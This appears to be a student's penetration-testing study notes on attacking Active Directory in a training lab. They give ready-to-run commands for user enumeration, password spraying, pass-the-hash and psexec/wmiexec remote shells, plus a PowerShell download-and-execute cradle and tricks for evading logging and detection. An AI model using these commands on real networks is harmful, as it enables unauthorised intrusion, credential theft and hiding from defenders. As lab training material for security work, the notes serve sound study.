## External Recon and Enumeration
- look through BGP-toolkit by Hurricane Electric for IP Space details
- viewdns.info for all DNS realated information
- go through companies social media, website and all the publicly available data
- dork for internal emails, files.
- use linkedin2username for username harvesting
- use dehashed for hunting cleartext passwords

# Initial domain enumeration
- Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.
- This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.
- Document any findings we come across for later use. Extremely important!

| Data Point |	Description |
|-----------|------------|
| AD Users	| We are trying to enumerate valid user accounts we can target for password spraying. |
| AD Joined Computers	| Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.|
| Key Services	| Kerberos, NetBIOS, LDAP, DNS |
| Vulnerable Hosts and Services	| Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold) |

## Identifying hosts
### wireshark
use wireshark to grather ARP, MDNS and other layer two packets.
*from the scan results we can identify the hosts 172.16.5.130, 172.16.5.225, 172.16.5.5, 172.16.5.25, 172.16.5.240*
*and from NBNS/MDNS protocol we identified the host ACADEMY-EA-WEB0<00> & ACADEMY-EA-WEB0<20>*
**TCPDUMP can also be used for this purpose** 
### Responder
Responder is a tool built to listen, analyze, and poison LLMNR, NBT-NS, and MDNS requests and responses. It has many more functions.
### perform fping on the subnet to identify the live hosts
### nmap -- use it to enumerate all the hosts that we found till now.
## Identifying users
### Kerbrute
Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from Insidetrust. 
## Password spraying
After obtaining the usernames we can try to perform password spraying but for that it'll be easier if we can retrieve the password policy enforced.
This can be done either by SMB NULL session or LDAP Anonymous bind.
If there are know credentials crackmapexec can be used
```
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
### rpcclient
```
rpcclient -U "" -N 172.16.5.5
>querydominfo
>getdompwinfo
```
### enum4linux or enum4linux-ng
```
enum4linux -P 172.16.5.5
```
Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.
```
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
### Enumerating Null Session - from Windows
```
net use \\DC01\ipc$ "" /u:""
```
### linux - LDAP Anonymous bind
With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapsearch.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. With ldapsearch, it can be a bit cumbersome but doable.
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
### windows
If we can authenticate to the domain from a Windows host, we can use built-in Windows binaries such as net.exe to retrieve the password policy. We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.
```
net accounts
```
```
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy
```

## Detailed User Enumeration
- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller
- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users
- Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist
### using enum4linux
```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
### rpcclient
```
rpcclient -U "" -N 172.16.5.5
>enumdomusers
```
### crackmapexec
```
crackmapexec smb 172.16.5.5 --users
```
### ldapsearch
If we choose to use ldapsearch we will need to specify a valid LDAP search filter. We can learn more about these search filters in the Active Directory LDAP module.
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```
### windapsearch
Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters). Here we can specify anonymous access by providing a blank username with the -u flag and the -U flag to tell the tool to retrieve just users.
```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
### using kerbrute
```
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
## Password spraying
### using rpcclient
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
### using kerbrute
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
### using crackmapexec
```
 sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```
### local admin spraying with crackmapexec
```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
## Internal password spraying from a domain joined windows
### Using DomainPasswordSpray.ps1
```
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Credential Enumeration from Linux
for this process we need atleast one valid credential to any account or service in the domain
### Crackmapexec
using SMB we can list users, shares, groups, loggedon-users and even look through the shares
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
the results from the spider_plus module will be stored in /tmp/spider_plus/<ipadd>
### SMBMap
credentialed enumeration
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
recursively listing directories
```
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
### rpcclient
as there is an SMB NULL session in this case unauthenticated enumeration can be performed using rpcclient. authenticated enumeration is also possible.
```
rpcclient -U "" -N 172.16.5.5
```
then we can list users and their RIDs. This will be helpful later. We will even be able create new users, groups etc.
### Impacket Toolkit
focusing on wmiexec.py and psexec.py
 The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.
```
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
wmiexec.py. It is a stealthier approach than psexec.py. But it is not fully interactive and creates a new instance for every command. And it doesn't give SYSTEM32
```
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```
### Windapsearch
domain admins
```
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
privileged users
```
 python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```
### Bloodhound
```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
zip the results and upload to the bloodhound gui to run queries on the data.

AD cheatsheet
```
https://wadcoms.github.io/
```
## Credential enumeration from Windows
for this purpose tools like ActiveDirectory Powershell module, PowerView, Sharpview,snaffler, and bloodhound
## Living of the Land
### Basic enumeration commands
| Command |	Result |
|-----------|--------|
| hostname	| Prints the PC's Name |  
| [System.Environment]::OSVersion.Version	| Prints out the OS version and revision level | 
| wmic qfe get Caption,Description,HotFixID,InstalledOn	| Prints the patches and hotfixes applied to the host| 
| ipconfig /all	| Prints out network adapter state and configurations| 
| set	| Displays a list of environment variables for the current session (ran from CMD-prompt)| 
| echo %USERDOMAIN%	| Displays the domain name to which the host belongs (ran from CMD-prompt)| 
| echo %logonserver%	| Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)| 

| Cmd-Let | Description |
| --- | --- |
| Get-Module | Lists available modules loaded for use. |
| Get-ExecutionPolicy -List | Will print the https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2 settings for each scope on a host. |
| Set-ExecutionPolicy Bypass -Scope Process | This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
| Get-ChildItem Env: | ft Key,Value | Return environment values such as key paths, users, computer information, etc. |
| powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.

```
Get-host
powershell.exe -version 2
```
### Check defenses
firewall checks
```
netsh advfirewall show allprofiles
```
Windows Defender Check (from CMD.exe)
```
sc query windefend
```
```
 Get-MpComputerStatus
```
check if anyone else is logged on the machine
```
qwinsta
```
### Network Information
| Networking Commands | Description |
| --- | --- |
| arp -a | Lists all known hosts stored in the arp table. |
| ipconfig /all | Prints out adapter settings for the host. We can figure out the network segment from here. |
| route print | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| netsh advfirewall show state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |

### Windows Management Instrumentation (WMI)
| Command | Description |
| --- | --- |
| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patch level and description of the Hotfixes applied |
| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list |
| wmic process list /format:list | A listing of all processes on host |
| wmic ntdomain list /format:list | Displays information about the Domain and Domain Controllers |
| wmic useraccount list /format:list | Displays information about all local accounts and any domain accounts that have logged into the device |
| wmic group list /format:list | Information about all local groups |
| wmic sysaccount list /format:list | Dumps information about any system accounts that are being used as service accounts. |
https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

### Net commands
| Command | Description |
| --- | --- |
| net accounts | Information about password requirements |
| net accounts /domain | Password and lockout policy |
| net group /domain | Information about domain groups |
| net group "Domain Admins" /domain | List users with domain admin privileges |
| net group "domain computers" /domain | List of PCs connected to the domain |
| net group "Domain Controllers" /domain | List PC accounts of domains controllers |
| net group <domain_group_name> /domain | User that belongs to the group |
| net groups /domain | List of domain groups |
| net localgroup | All available groups |
| net localgroup administrators /domain | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
| net localgroup Administrators | Information about a group (admins) |
| net localgroup administrators [username] /add | Add user to administrators |
| net share | Check current shares |
| net user <ACCOUNT_NAME> /domain | Get information about a user within the domain |
| net user /domain | List all users of the domain |
| net user %username% | Information about the current user |
| net use x: \computer\share | Mount the share locally |
| net view | Get a list of computers |
| net view /all /domain[:domainname] | Shares on the domains |
| net view \computer /ALL | List shares of a computer |
| net view /domain | List of PCs of the domain |

Net Commands Trick
If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.

### Dsquery
Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.
User search
```
dsquery user
```
Computer search
```
dsquery computer
```
We can use a dsquery wildcard search to view all objects in an OU, for example.
```
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute. - Users with specific attribute set
```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
The below search filter looks for all Domain Controllers in the current domain, limiting to five results.
```
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
### LDAP Filtering Explained
You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).
=8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.
![image](https://github.com/Kript0r3x/CPTS/assets/65650002/d0290e12-2cc4-4de0-8d50-e1ce773e386e)
### OID match strings
OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1.2.840.113556.1.4.803
When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

1.2.840.113556.1.4.804
When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

1.2.840.113556.1.4.1941
This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

### Logical Operators
When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))

This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
